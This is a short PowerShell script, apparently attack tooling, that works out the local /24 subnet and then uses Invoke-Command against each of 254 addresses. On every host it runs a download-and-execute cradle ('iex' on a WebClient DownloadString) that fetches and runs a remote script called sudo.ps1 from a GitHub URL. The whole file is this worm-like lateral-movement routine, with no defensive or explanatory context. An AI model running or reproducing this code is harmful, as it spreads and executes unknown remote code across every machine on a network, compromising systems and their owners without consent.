$localIp = (
    Get-NetIPConfiguration |
    Where-Object {
        $_.IPv4DefaultGateway -ne $null -and
        $_.NetAdapter.Status -ne "Disconnected"
    }
).IPv4Address.IPAddress

$splitedIp = $LocalIp.Split(".")
$ipRange = ($splitedIp[0]+"."+$splitedIp[1]+"."+$splitedIp[2])

$listofIPs = 1..254 | % {"$ipRange.$_"}

foreach ($ip in $listofIPs){
  Invoke-Command -ComputerName $ip -ScriptBlock { powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/eulersdisk/system_security/main/sudo.ps1')" }
}
